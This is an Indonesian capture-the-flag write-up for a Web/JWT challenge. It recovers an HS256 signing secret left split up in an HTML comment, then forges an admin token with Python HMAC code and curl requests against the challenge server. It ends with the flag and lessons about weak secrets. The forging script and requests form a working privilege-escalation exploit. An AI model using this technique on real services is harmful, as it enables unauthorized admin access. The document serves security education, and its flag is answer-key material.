# Writeup — Arsip Tanpa Tanda

- **Kategori:** Web / JWT
- **Poin:** 689 (1 solve)
- **Service:** http://168.110.219.59:5008/
- **Flag:** `TechtonicExpoCTF{tanda_tanpa_sah_D35D4ECD}`

---

## Deskripsi

> Arsip ini mengaku setiap dokumennya bertanda tangan. Tapi tanda tangannya tidak pernah benar-benar rahasia. Penjaga arsip menuliskannya di tempat yang menurutnya tidak akan dilihat siapa pun, dengan cara yang dipecah-pecah seperti teka-teki yang terlalu percaya diri.
>
> Setiap pengunjung menerima penanda yang menentukan hak akses. Ruang admin hanya membuka pintunya bagi peran yang tepat, dan penanda itu bisa dibuat ulang oleh siapa saja yang tahu rahasia kecil di baliknya.
>
> Jangan baca penanda itu sebagai teks biasa. Baca strukturnya. Kemudian putuskan siapa kamu sebenarnya.

Petunjuk kunci dari deskripsi:
- "penanda ... dibuat ulang oleh siapa saja yang tahu rahasia kecil" → token bisa **dipalsukan** kalau tahu **secret**-nya.
- "tanda tangannya ... dituliskan ... dengan cara yang dipecah-pecah" → secret disembunyikan (di-split) di suatu tempat.
- "Baca strukturnya. Kemudian putuskan siapa kamu sebenarnya." → ubah **peran (role)** di dalam token.

---

## Recon

Halaman utama memberi setiap pengunjung sebuah **penanda** (JWT):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJhbiI6InBlbmd1bmp1bmciLCJpYXQiOjE3ODg1NzQ2ODJ9.i9hL0JwVPEFu3Kxc4TQuF1yJYeaDBZ6Ysn9bOR_L3YY
```

Decode tiap bagian (base64url):

- **Header:** `{"alg":"HS256","typ":"JWT"}`
- **Payload:** `{"peran":"pengunjung","iat":1788574682}`

Jadi ini JWT **HS256** dengan field `peran` (role) = `pengunjung` (visitor).
Untuk masuk ruang admin, `peran` perlu diubah jadi `admin`. Karena HS256 = HMAC dengan secret, kita butuh **secret**-nya untuk memalsukan signature.

Halaman `/petunjuk.txt` (catatan penjaga):

> penjaga arsip suka kata sandi pendek. bentuknya: huruf kecil semua, enam karakter, dan dia menuliskannya di komentar halaman utama dengan cara yang dipecah-pecah.

---

## Menemukan Secret

Ambil **raw HTML** halaman utama (bukan render biasa) untuk melihat komentar HTML:

```bash
curl -s http://168.110.219.59:5008/
```

Di akhir halaman ada komentar tersembunyi:

```html
<!-- penjaga arsip selalu menandatangani dengan kata sandi enam huruf. Dia bilang mirip nama kotanya: c_r_y_p_t_0 -->
```

Secret ditulis "dipecah-pecah" dengan pemisah `_`. Buang pemisahnya:

```
c_r_y_p_t_0  ->  crypt0
```

**Secret = `crypt0`** (6 karakter, huruf kecil; `0` = angka nol).

### Verifikasi secret

Signature token asli dicocokkan dengan HMAC-SHA256 memakai key `crypt0` → **cocok persis**, mengonfirmasi secret benar.

```python
import hmac, hashlib, base64

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJhbiI6InBlbmd1bmp1bmciLCJpYXQiOjE3ODg1NzQ2ODJ9.i9hL0JwVPEFu3Kxc4TQuF1yJYeaDBZ6Ysn9bOR_L3YY"
h, p, s = tok.split('.')
sig = b64url(hmac.new(b"crypt0", f"{h}.{p}".encode(), hashlib.sha256).digest()).decode()
print(sig == s)   # True
```

---

## Forge Token Admin

Bikin token baru dengan payload `{"peran":"admin",...}` lalu tandatangani ulang pakai `crypt0`:

```python
import hmac, hashlib, base64, json

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

header  = b64url(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode())
payload = b64url(json.dumps({"peran":"admin","iat":1788574682}, separators=(',',':')).encode())
sig     = b64url(hmac.new(b"crypt0", header + b"." + payload, hashlib.sha256).digest())
print((header + b"." + payload + b"." + sig).decode())
```

Hasil token forge:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJhbiI6ImFkbWluIiwiaWF0IjoxNzg4NTc0NjgyfQ.3oaOKZBKgFJ9GA52O60epaxpohOEMB51v3H7TQ_skAE
```

> Cara instan lain: pakai [jwt.io](https://jwt.io), ganti `peran` jadi `admin`, isi secret `crypt0`.

---

## Cara Mengirim Penanda (bagian yang licik)

"Baca **strukturnya**" juga soal *cara* mengirim token. Hasil percobaan:

| Metode                         | Hasil                         |
|--------------------------------|-------------------------------|
| Cookie (`penanda`/`token`/dll) | HTTP 400 "Tidak ada penanda"  |
| Header `Authorization: Bearer` | HTTP 400 "Tidak ada penanda"  |
| `POST /admin`                  | HTTP 405 Method Not Allowed   |
| **`GET /admin?token=<jwt>`**   | ✅ **HTTP 200 — Admin**        |

Ternyata `/admin` hanya menerima **GET** dengan token di **query parameter `token`**:

```bash
curl -s "http://168.110.219.59:5008/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZXJhbiI6ImFkbWluIiwiaWF0IjoxNzg4NTc0NjgyfQ.3oaOKZBKgFJ9GA52O60epaxpohOEMB51v3H7TQ_skAE"
```

Respon:

```
// SELAMAT DATANG ADMIN
Kunci arsip: tanda_tanpa_sah
```

---

## Flag

Template flag: `TechtonicExpoCTF{kunci_KODETIM}`

- `kunci`   → kunci arsip = `tanda_tanpa_sah`
- `KODETIM` → kode kunci tim = `D35D4ECD`

```
TechtonicExpoCTF{tanda_tanpa_sah_D35D4ECD}
```

---

## Pelajaran

- JWT **HS256** dengan secret lemah/bocor = bisa dipalsukan sepenuhnya (ubah role → privilege escalation).
- Jangan pernah menyimpan secret di tempat yang bisa diakses klien (komentar HTML, JS, dsb.), sekalipun "dipecah-pecah".
- Selalu periksa **raw source** (komentar HTML), file petunjuk (`/petunjuk.txt`, `robots.txt`, dll), dan **cara** parameter dikirim (cookie vs header vs query vs body).
